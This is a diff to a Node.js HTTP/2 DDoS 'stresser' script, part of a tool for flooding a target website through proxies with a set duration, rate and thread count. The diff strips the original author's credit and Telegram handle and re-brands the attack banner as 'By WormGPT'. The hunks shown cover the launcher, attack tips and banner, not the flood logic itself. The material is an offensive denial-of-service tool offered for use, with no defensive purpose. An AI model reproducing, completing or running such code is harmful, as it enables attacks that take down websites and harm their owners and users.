@@ -1,5 +1,3 @@
-//Method By STEVEN•STRESSER🕊🪽
-//Jangan Dihapus Yang Hapus Saya Sumpah Jadi Yatim 
  const net = require("net");
  const http2 = require("http2");
  const tls = require("tls");
@@ -357,7 +355,7 @@ const tips1 =[
  "This Script Only Work On http/2!",
  "Recommended Big Proxy If Power Target In Website",
  "Dont Trying Selling My Script!!",
- "My Telegram: t.me/@stevenstresser"
+ "My Telegram: t.me/@Steveezarex"
 ];
 const platformd = [
  "Windows",
@@ -505,14 +503,14 @@ const RESTART_DELAY = 1000;
 
  if (cluster.isMaster) {
     console.clear()
-    console.log(`HTTP-DDoS Bypass By t.me/@stevenstresser`.rainbow)
-    console.log(`-----------------Methods H2SZ By t.me/@stevenstresser---------------------------`.gray)
+    console.log(`HTTP-DDoS Bypass`.rainbow)
+    console.log(`-----------------Methods H2SZ By WormGPT---------------------------`.gray)
     console.log(`Target: `.brightYellow + process.argv[2])
     console.log(`Time: `.brightYellow + process.argv[3])
     console.log(`Rate: `.brightYellow + process.argv[4])
     console.log(`Thread: `.brightYellow + process.argv[5])
     console.log(`ProxyFile: `.brightYellow + process.argv[6])
-    console.log(`-------------------Succesfully Attack By Steven-Stresser🕊🪽-------------------------`.gray)
+    console.log(`-------------------Succesfully Attack By WormGPT-------------------------`.gray)
     console.log(`Note: `.brightCyan + tipsz)
 
     const restartScript = () => {
